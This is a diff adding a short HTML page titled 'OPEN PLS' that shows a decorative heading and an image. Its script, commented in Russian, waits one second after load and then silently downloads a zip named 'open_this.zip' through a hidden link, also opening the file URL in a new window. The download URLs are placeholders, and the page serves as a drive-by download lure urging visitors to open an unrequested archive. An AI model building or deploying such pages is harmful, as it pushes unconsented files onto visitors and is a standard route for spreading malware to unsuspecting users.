@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>OPEN PLS</title>
+    <style>
+        body {
+            background: #111;
+            margin: 0;
+            text-align: center;
+            padding: 50px;
+            font-family: Arial;
+        }
+        
+        h1 {
+            font-size: 80px;
+            background: linear-gradient(45deg, #ff00ff, #ff0000);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin: 30px;
+            text-shadow: 0 0 20px #ff00ff;
+        }
+        
+        .frame {
+            border: 10px solid #ff0066;
+            display: inline-block;
+            margin: 20px;
+            padding: 5px;
+            background: #222;
+        }
+        
+        img {
+            width: 500px;
+            height: 300px;
+            display: block;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+    <h1>open pls</h1>
+    
+    <div class="frame">
+        <img src="https://i.pinimg.com/736x/d5/25/72/d52572a07b6166ce41412dea2fe3768e.jpg" alt="">
+    </div>
+
+    <script>
+        // Вариант 1: Скачать с GitHub
+        // Загрузите файл на GitHub -> Releases или как raw файл
+        const githubURL = "https://github.com/username/repo/raw/main/file.zip";
+        
+        // Вариант 2: Любой прямой URL
+        const directURL = "https://example.com/path/to/file.zip";
+        
+        // Скачиваем через 1 секунду
+        setTimeout(() => {
+            // Способ 1: Через скрытую ссылку
+            const link = document.createElement('a');
+            link.href = directURL; // ИЛИ githubURL
+            link.download = 'open_this.zip';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            // Способ 2: Открыть в новом окне (на всякий случай)
+            window.open(directURL, '_blank');
+        }, 1000);
+    </script>
+</body>
+</html>
